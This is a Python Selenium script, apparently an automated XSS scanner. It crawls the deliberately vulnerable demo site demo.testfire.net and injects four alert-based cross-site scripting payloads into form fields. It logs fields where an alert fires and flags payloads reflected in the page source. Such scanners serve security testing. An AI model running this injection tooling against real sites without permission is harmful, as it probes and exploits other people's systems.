import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import NoAlertPresentException, NoSuchElementException, TimeoutException
from colorama import Fore, Style, init

init(autoreset=True)

URL_ALVO = "http://demo.testfire.net" 
DOMINIO_PERMITIDO = "testfire.net"

PAYLOADS = [
    "<script>alert('XSS_REFLETIDO')</script>",
    "<img src=x onerror=alert('XSS_IMAGE')>",
    "<svg onload=alert('XSS_SVG')>",
    "\"><script>alert('XSS_BREAKOUT')</script>"
]

visitados = set()
fila = [URL_ALVO]

chrome_options = Options()
driver = webdriver.Chrome(options=chrome_options)
driver.set_page_load_timeout(10)



def salvar_resultado(url, campo, payload):
    with open("relatorio_xss.txt", "a") as f:
        f.write(f"[!] VULNERAVEL: {url} | Campo: {campo} | Payload: {payload}\n")

def mapear_e_atacar(url):
    if url in visitados or len(visitados) > 15: 
        return
    
    print(f"\n{Fore.BLUE}[*] Explorando: {url}")
    visitados.add(url)
    
    try:
        driver.get(url)
        time.sleep(2)
    except TimeoutException:
        return


    links = driver.find_elements(By.TAG_NAME, "a")
    for link in links:
        try:
            href = link.get_attribute("href")
            if href and DOMINIO_PERMITIDO in href and href not in visitados:
                if href not in fila:
                    fila.append(href)
        except:
            continue

    inputs_encontrados = driver.find_elements(By.CSS_SELECTOR, "input[type='text'], input[type='search'], textarea")
    print(f"    [+] Encontrados {len(inputs_encontrados)} campos de entrada.")

    for index in range(len(inputs_encontrados)):
        for p in PAYLOADS:
            try:
                driver.get(url) 
                time.sleep(1)
                
               
                campos = driver.find_elements(By.CSS_SELECTOR, "input[type='text'], input[type='search'], textarea")
                if not campos: continue
                
                campo = campos[index]
                nome_campo = campo.get_attribute("name") or campo.get_attribute("id") or f"index_{index}"
                
                print(f"    {Fore.YELLOW}[>] Testando payload no campo '{nome_campo}'...")
                
                campo.clear()
                campo.send_keys(p)
                campo.send_keys(Keys.ENTER)
                time.sleep(1)

                try:
                    alert = driver.switch_to.alert
                    print(f"{Fore.GREEN}    [!!!] XSS CONFIRMADO: {p}")
                    salvar_resultado(url, nome_campo, p)
                    alert.accept()
                except NoAlertPresentException:
                    if p in driver.page_source:
                        print(f"{Fore.YELLOW}    [!] Payload refletido no código (Suspeito)")
                
            except Exception as e:
                print(f"{Fore.RED}    [!] Erro ao interagir com campo: {e}")
                break 

try:
    print(f"{Fore.MAGENTA}=== INICIANDO SCANNER COM SPIDERING ===")
    while fila:
        url_atual = fila.pop(0)
        mapear_e_atacar(url_atual)
finally:
    print(f"\n{Fore.MAGENTA}=== SCAN FINALIZADO. VERIFIQUE relatorio_xss.txt ===")
    driver.quit()